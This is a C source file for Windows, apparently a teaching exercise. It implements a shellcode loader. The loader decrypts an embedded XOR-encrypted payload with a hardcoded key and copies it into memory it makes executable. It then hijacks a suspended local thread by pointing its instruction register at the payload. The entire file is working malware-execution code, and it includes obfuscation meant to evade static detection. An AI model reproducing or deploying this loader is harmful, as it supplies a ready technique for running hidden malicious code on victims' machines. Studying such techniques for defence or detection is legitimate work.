#include <stdio.h>
#include <Windows.h>
#include <string.h>

BOOL DecryptShellcode(_In_ UCHAR Shellcode[], _In_ DWORD dwShellcodeSize, _In_ UCHAR Key[], _In_ DWORD dwKeySize) {
	if (!Shellcode || !Key || !dwKeySize || !dwShellcodeSize) {
		printf("\t[-] DecryptShellcode received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Decrypt the Shellcode!\n");
	getch();

	for (int i = 0, j = 0; i < dwShellcodeSize; i++) {
		Shellcode[i] = Shellcode[i] ^ Key[j++] ^ i;
		if (j == dwKeySize) j = 0;
	}

	printf("[+] Done!\n\n");
	return TRUE;
}

void DummyFunction() {
	int i = 0;
	printf("\t[i] This is the Dummy Function that will be the target!\n");
	for (int j = 0; j < 10; j++)
		i = i ^ j;
}

BOOL CreateDummyThread(_Out_ HANDLE * hDummyThread, _Out_ DWORD * dwThreadId) {
	DWORD dwId = NULL;

	if (!hDummyThread || !dwThreadId) {
		printf("\t[-] CreateDummyThread received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Create the Dummy Thread!\n");
	getch();

	*hDummyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, &dwId);
	if (!*hDummyThread) {
		printf("\t[-] CreateThread faile with status: %d\n", GetLastError());
		return FALSE;
	}

	*dwThreadId = dwId;

	printf("\t[i] The Thread ID is: %d\n", *dwThreadId);

	printf("[+] Done!\n\n");
	return TRUE;
}

BOOL InjectShellcode(_In_ PBYTE pPayloadData, _In_ DWORD dwPayloadSize, _Out_ PVOID* pMemoryPage) {
	DWORD dwOldProtection = NULL;
	if (!pPayloadData || !dwPayloadSize || !pMemoryPage) {
		printf("\t[-] InjectShellcode received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Inject The Shellcode!\n");
	getch();

	*pMemoryPage = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!*pMemoryPage) {
		printf("\t[-] VirtualAlloc faile with status: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Memory Page Allocated at Address %p and With PAGE_READWRITE Permissions!\n", *pMemoryPage);

	memcpy(*pMemoryPage, pPayloadData, dwPayloadSize);
	memset(pPayloadData, '\0', dwPayloadSize);

	printf("\t[i] Shellcode Injected and Old One Cleaned!\n");

	if (!VirtualProtect(*pMemoryPage, dwPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("\t[-] VirtualProtect faile with status: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Changed Memory Page Permissions to PAGE_EXECUTE_READ!\n");

	printf("[+] Done!\n\n");
	return TRUE;
}

BOOL HijackLocalThread(_In_ HANDLE* hDummyThread, _In_ PVOID * pPayload) {
	CONTEXT Ctxt = { .ContextFlags = CONTEXT_CONTROL };

	if (!hDummyThread || !pPayload) {
		printf("\t[-] HijackLocalThread received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Hijack the Local Thread!\n");
	getch();

	if (!GetThreadContext(*hDummyThread, &Ctxt)) {
		printf("\t[-] GetThreadContext faile with status: %d\n", GetLastError());
		return FALSE;
	}

	Ctxt.Rip = *pPayload;

	printf("\t[i] Thread RIP/EIP modified to: %p address\n", *pPayload);

	if (!SetThreadContext(*hDummyThread, &Ctxt)) {
		printf("\t[-] SetThreadContext faile with status: %d\n", GetLastError());
		return FALSE;
	}

	printf("[+] Done!\n\n");
	return TRUE;
}

int main(const int argc, const char* argv[]) {
	HANDLE hDummyThread = NULL;
	DWORD dwThreadId = NULL;
	LPVOID pMemoryPage = NULL;
	const UCHAR Key[] = {
		0x1B, 0x75, 0x89, 0x3C, 0xE, 0x5C, 0x66, 0xEC, 0x16, 0x2F, 0x7F, 0xE9, 0x51, 0x31, 0xFD, 0xF
	};
	UCHAR Shellcode[] = {
		0xE7, 0x3C, 0x08, 0xDB, 0xFA, 0xB1, 0xA0, 0xEB, 0x1E, 0x26, 0x34, 0xB3, 0x1C, 0x6C, 0xA1, 0x51,
		0x5D, 0x2C, 0xAA, 0xFD, 0x7F, 0x01, 0xFB, 0xA9, 0x6E, 0x7E, 0xEE, 0xA0, 0x55, 0x64, 0x68, 0x42,
		0x1B, 0x1C, 0x20, 0x6D, 0x7A, 0x31, 0x4F, 0x7C, 0x74, 0x4C, 0x18, 0xF3, 0xB4, 0x54, 0xE2, 0xE0,
		0x87, 0x78, 0xDA, 0x73, 0x38, 0x45, 0x70, 0x9A, 0xEF, 0xDF, 0x48, 0x93, 0x6C, 0xCD, 0x21, 0xDD,
		0x09, 0x75, 0x9A, 0x37, 0xC1, 0x4B, 0x00, 0x20, 0x1C, 0x5A, 0x7D, 0xA3, 0xCD, 0xF7, 0x33, 0xC8,
		0x4B, 0x24, 0xDB, 0x27, 0xDF, 0xC9, 0x44, 0xDC, 0x06, 0x77, 0xF5, 0xE2, 0x86, 0x24, 0xBB, 0x14,
		0xF0, 0x54, 0xCB, 0x16, 0x6B, 0xE9, 0xE3, 0xDD, 0x36, 0xB9, 0xDC, 0xC3, 0xB6, 0x68, 0x1B, 0x28,
		0x6A, 0xD2, 0xB6, 0x7E, 0xB3, 0x61, 0x21, 0x5B, 0xC2, 0x17, 0xC4, 0x5B, 0x20, 0x0D, 0x82, 0xB1,
		0xA3, 0x14, 0x7E, 0x4E, 0xC6, 0xDA, 0xAC, 0x4F, 0x96, 0xE3, 0xCC, 0xB3, 0xA8, 0x64, 0x2B, 0xC4,
		0x00, 0xA4, 0x3F, 0xE6, 0x9B, 0x19, 0x96, 0x3A, 0x05, 0xBA, 0xAD, 0x36, 0x46, 0xEC, 0x7F, 0xD9,
		0xBA, 0x04, 0x6A, 0x14, 0xAE, 0x71, 0x88, 0x4A, 0x6E, 0xC7, 0x8D, 0x03, 0xA5, 0xC2, 0x0A, 0xFA,
		0xEA, 0x9C, 0x7A, 0xD6, 0xFB, 0xB3, 0x98, 0xD8, 0x42, 0xB6, 0x84, 0x00, 0x12, 0x6C, 0x1B, 0xF1,
		0x82, 0xEE, 0x03, 0x74, 0xD8, 0x70, 0xF7, 0xD4, 0x21, 0x19, 0xE8, 0x6A, 0x27, 0xFD, 0x33, 0xC0,
		0xCB, 0xA4, 0x5B, 0xEF, 0xDA, 0xC1, 0x3D, 0xB6, 0xCF, 0xF7, 0xA5, 0x32, 0xCC, 0x56, 0x12, 0x5B,
		0x94, 0x13, 0x94, 0x0A, 0x51, 0x59, 0x9D, 0x21, 0xF4, 0x87, 0x2F, 0xA4, 0x28, 0x61, 0x8E, 0x1F,
		0x3E, 0xCC, 0xF8, 0x0B, 0xD2, 0x95, 0x96, 0x67, 0xE4, 0x56, 0x7E, 0xF2, 0xD8, 0xC9, 0xB8, 0xB7,
		0x08, 0x06, 0xE4, 0x55, 0x0A, 0x00, 0x21, 0x62, 0xC4, 0xD9, 0xA0, 0x81, 0x3C, 0x50, 0x90, 0x00
	};
	DWORD dwShellcodeSize = sizeof(Shellcode);

	
	if (!CreateDummyThread(&hDummyThread, &dwThreadId)) {
		printf("[-] Fail!\n\n");
		return 1;
	}

	if (!DecryptShellcode(Shellcode, dwShellcodeSize, Key, sizeof(Key))) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	if (!InjectShellcode(Shellcode, dwShellcodeSize, &pMemoryPage)) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	if (!HijackLocalThread(&hDummyThread, &pMemoryPage)) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	printf("[#] Press <Enter> to Resume the Thread!\n");
	getch();
	ResumeThread(hDummyThread);
	printf("[+] Done!\n\n");


	printf("[#] Press <Enter> to Exit!\n");
	getch();

_EndOfFunction:
	if (hDummyThread)
		CloseHandle(hDummyThread);

	if (pMemoryPage)
		VirtualFree(pMemoryPage, 0, MEM_DECOMMIT | MEM_RELEASE);

	return 0;
}